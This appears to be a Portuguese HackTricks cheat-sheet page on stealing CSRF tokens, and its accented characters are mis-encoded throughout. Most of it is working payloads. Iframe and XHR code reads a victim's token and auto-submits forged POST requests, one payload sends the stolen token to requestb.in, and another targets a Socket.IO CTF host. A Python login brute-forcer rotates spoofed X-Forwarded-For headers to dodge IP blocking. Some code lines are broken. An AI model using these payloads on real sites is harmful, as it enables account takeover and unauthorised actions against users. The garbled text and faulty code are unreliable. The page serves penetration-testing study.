Uma t√©cnica comum de ataque CSRF (Cross-Site Request Forgery) envolve roubar o token CSRF de um usu√°rio e us√°-lo para enviar uma solicita√ß√£o POST maliciosa em seu nome. Isso pode ser feito usando um iframe, um formul√°rio oculto e Ajax.

1. Primeiro, o atacante precisa obter o token CSRF do usu√°rio. Isso pode ser feito explorando uma vulnerabilidade de vazamento de token CSRF em um site ou usando t√©cnicas de engenharia social para enganar o usu√°rio e faz√™-lo revelar o token.

2. Uma vez que o token CSRF tenha sido obtido, o atacante pode criar um iframe oculto em uma p√°gina controlada por ele. O iframe deve apontar para o alvo do ataque, que √© o endpoint que processa a solicita√ß√£o POST.

```html
<iframe id="csrf-frame" style="display:none;"></iframe>
```

3. Em seguida, o atacante cria um formul√°rio oculto dentro do iframe e preenche os campos necess√°rios, incluindo o token CSRF roubado.

```html
<form id="csrf-form" action="https://www.exemplo.com/endpoint" method="POST">
  <input type="hidden" name="param1" value="valor1">
  <input type="hidden" name="param2" value="valor2">
  <input type="hidden" name="csrf_token" value="TOKEN_CSRF_ROUBADO">
</form>
```

4. O atacante usa JavaScript para enviar automaticamente o formul√°rio assim que a p√°gina √© carregada.

```html
<script>
  document.getElementById('csrf-frame').onload = function() {
    document.getElementById('csrf-form').submit();
  };
  document.getElementById('csrf-frame').src = 'about:blank';
</script>
```

5. O navegador carrega o iframe oculto e envia a solicita√ß√£o POST para o endpoint especificado, incluindo o token CSRF roubado. Como a solicita√ß√£o √© originada do navegador do usu√°rio, o servidor acredita que √© uma solicita√ß√£o leg√≠tima e processa-a.

Essa t√©cnica de ataque CSRF pode ser eficaz para explorar sites que n√£o implementam prote√ß√µes adequadas contra ataques CSRF, como a verifica√ß√£o do token CSRF em todas as solicita√ß√µes POST. √â importante que os desenvolvedores implementem medidas de seguran√ßa, como tokens CSRF aleat√≥rios e exclusivos, para mitigar esse tipo de ataque.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o POST usando um iframe e um formul√°rio**

Uma t√©cnica comum de ataque CSRF (Cross-Site Request Forgery) envolve roubar o token CSRF de um usu√°rio e us√°-lo para enviar uma solicita√ß√£o POST maliciosa. Isso pode ser feito usando um iframe e um formul√°rio.

1. Primeiro, o atacante cria um site malicioso que cont√©m um iframe invis√≠vel. O atributo `src` do iframe √© definido como o URL do site alvo.

```html
<iframe style="display:none" src="https://www.sitetalvo.com"></iframe>
```

2. Em seguida, o atacante cria um formul√°rio dentro do iframe. O formul√°rio √© preenchido com os campos necess√°rios para a solicita√ß√£o POST, incluindo o token CSRF.

```html
<form action="https://www.sitetalvo.com/endpoint" method="POST">
  <input type="hidden" name="csrf_token" value="TOKEN_CSRF_AQUI">
  <input type="hidden" name="parametro1" value="valor1">
  <input type="hidden" name="parametro2" value="valor2">
  <input type="submit" value="Enviar">
</form>
```

3. Quando o usu√°rio visita o site malicioso, o iframe √© carregado e o formul√°rio √© enviado automaticamente, sem o conhecimento do usu√°rio. A solicita√ß√£o POST √© enviada para o endpoint do site alvo, usando o token CSRF roubado.

Essa t√©cnica explora a confian√ßa do site alvo no token CSRF para autenticar as solicita√ß√µes. Ao roubar o token CSRF de um usu√°rio autenticado, o atacante pode realizar a√ß√µes em nome do usu√°rio sem o seu consentimento.

Para se proteger contra ataques CSRF, os desenvolvedores devem implementar medidas de seguran√ßa, como a inclus√£o de tokens CSRF exclusivos em cada formul√°rio e a valida√ß√£o desses tokens em todas as solicita√ß√µes POST recebidas.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Roubar token e envi√°-lo usando 2 iframes**

Uma t√©cnica comum de Cross-Site Request Forgery (CSRF) envolve roubar um token de autentica√ß√£o de um usu√°rio e envi√°-lo para um atacante usando dois iframes.

1. O atacante cria uma p√°gina maliciosa que cont√©m dois iframes. O primeiro iframe √© invis√≠vel e aponta para o site alvo que cont√©m a funcionalidade que o atacante deseja explorar. O segundo iframe √© vis√≠vel e aponta para um servidor controlado pelo atacante.

2. Quando a v√≠tima visita a p√°gina maliciosa, o primeiro iframe √© carregado e faz uma solicita√ß√£o para o site alvo. Como a v√≠tima est√° autenticada no site alvo, o servidor responde com um token de autentica√ß√£o v√°lido.

3. O JavaScript no primeiro iframe extrai o token de autentica√ß√£o da resposta do servidor e o envia para o segundo iframe, que est√° apontando para o servidor controlado pelo atacante.

4. O segundo iframe envia o token de autentica√ß√£o para o servidor controlado pelo atacante, permitindo que o atacante assuma a identidade da v√≠tima e execute a√ß√µes em nome dela.

Essa t√©cnica √© eficaz porque o token de autentica√ß√£o √© enviado para o servidor controlado pelo atacante, permitindo que ele acesse recursos protegidos em nome da v√≠tima. Para se proteger contra esse tipo de ataque, os desenvolvedores devem implementar medidas de seguran√ßa, como o uso de tokens anti-CSRF e a valida√ß√£o de refer√™ncia do cabe√ßalho HTTP.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTRoubar token CSRF com Ajax e enviar um post com um formul√°rio**

Uma t√©cnica comum de ataque CSRF (Cross-Site Request Forgery) envolve roubar o token CSRF de um usu√°rio e us√°-lo para enviar uma solicita√ß√£o POST maliciosa. Isso pode ser feito usando Ajax para obter o token CSRF de uma p√°gina e, em seguida, envi√°-lo junto com uma solicita√ß√£o POST falsificada.

Aqui est√° um exemplo de como realizar esse tipo de ataque:

```javascript
// Obter o token CSRF usando Ajax
var xhr = new XMLHttpRequest();
xhr.open('GET', '/get-csrf-token', true);
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var csrfToken = xhr.responseText;

    // Enviar uma solicita√ß√£o POST falsificada com o token CSRF
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '/transfer-money';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'csrfToken';
    input.value = csrfToken;
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
  }
};
xhr.send();
```

Neste exemplo, o c√≥digo JavaScript faz uma solicita√ß√£o GET para obter o token CSRF de `/get-csrf-token`. Uma vez que o token √© obtido com sucesso, ele √© usado para criar um formul√°rio HTML com um campo oculto contendo o token CSRF. Em seguida, o formul√°rio √© anexado ao corpo do documento e enviado automaticamente.

Ao visitar uma p√°gina maliciosa que cont√©m esse c√≥digo, o token CSRF do usu√°rio ser√° roubado e usado para enviar uma solicita√ß√£o POST falsificada para `/transfer-money`. Isso pode resultar em uma transfer√™ncia de dinheiro n√£o autorizada ou em outras a√ß√µes indesejadas.

Para se proteger contra ataques CSRF, √© importante implementar medidas de seguran√ßa, como a inclus√£o de tokens CSRF em formul√°rios e a valida√ß√£o desses tokens em todas as solicita√ß√µes POST.
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF com Socket.IO

O Cross-Site Request Forgery (CSRF) √© uma vulnerabilidade que permite que um atacante execute a√ß√µes n√£o autorizadas em nome de um usu√°rio autenticado em um aplicativo da web. O Socket.IO √© uma biblioteca JavaScript que permite a comunica√ß√£o em tempo real entre o cliente e o servidor. Neste cap√≠tulo, discutiremos como o CSRF pode ser explorado em aplicativos que utilizam o Socket.IO.

#### Como o CSRF funciona com o Socket.IO?

O Socket.IO utiliza um mecanismo de autentica√ß√£o baseado em cookies para estabelecer e manter a conex√£o entre o cliente e o servidor. Isso significa que, quando um usu√°rio autenticado acessa um aplicativo que utiliza o Socket.IO, um cookie de autentica√ß√£o √© armazenado no navegador do usu√°rio.

No entanto, o Socket.IO n√£o possui prote√ß√£o nativa contra CSRF. Isso significa que um atacante pode explorar essa vulnerabilidade para executar a√ß√µes n√£o autorizadas em nome do usu√°rio autenticado.

#### Explorando o CSRF com Socket.IO

Para explorar o CSRF com Socket.IO, um atacante precisa enganar o usu√°rio autenticado para que ele acesse um site malicioso enquanto estiver conectado ao aplicativo alvo. O site malicioso pode conter um c√≥digo JavaScript que envia solicita√ß√µes Socket.IO para o aplicativo alvo, aproveitando a conex√£o estabelecida pelo cookie de autentica√ß√£o.

Ao executar essas solicita√ß√µes, o atacante pode realizar a√ß√µes n√£o autorizadas em nome do usu√°rio autenticado, como enviar mensagens, modificar dados ou executar outras opera√ß√µes dispon√≠veis no aplicativo.

#### Mitiga√ß√£o do CSRF com Socket.IO

Para mitigar o risco de CSRF com Socket.IO, √© recomendado implementar medidas de prote√ß√£o, como:

- Utilizar tokens CSRF: Ao gerar um token CSRF exclusivo para cada sess√£o do usu√°rio e inclu√≠-lo em todas as solicita√ß√µes Socket.IO, √© poss√≠vel verificar a autenticidade das solicita√ß√µes recebidas pelo servidor.

- Verificar a origem da solicita√ß√£o: O servidor pode verificar se a origem da solicita√ß√£o Socket.IO corresponde ao dom√≠nio esperado. Isso pode ajudar a evitar solicita√ß√µes maliciosas de sites n√£o autorizados.

- Implementar SameSite cookies: Configurar os cookies de autentica√ß√£o como SameSite=Lax ou SameSite=Strict pode ajudar a prevenir ataques CSRF, limitando a forma como os cookies s√£o enviados em solicita√ß√µes de terceiros.

Implementar essas medidas de prote√ß√£o pode ajudar a reduzir o risco de explora√ß√£o do CSRF em aplicativos que utilizam o Socket.IO. No entanto, √© importante realizar testes de penetra√ß√£o para garantir que todas as vulnerabilidades sejam identificadas e corrigidas adequadamente.
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Login Brute Force

O c√≥digo pode ser usado para realizar um ataque de for√ßa bruta em um formul√°rio de login usando um token CSRF (Tamb√©m est√° utilizando o cabe√ßalho X-Forwarded-For para tentar contornar um poss√≠vel bloqueio de IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Ferramentas <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Refer√™ncias

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando seus clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
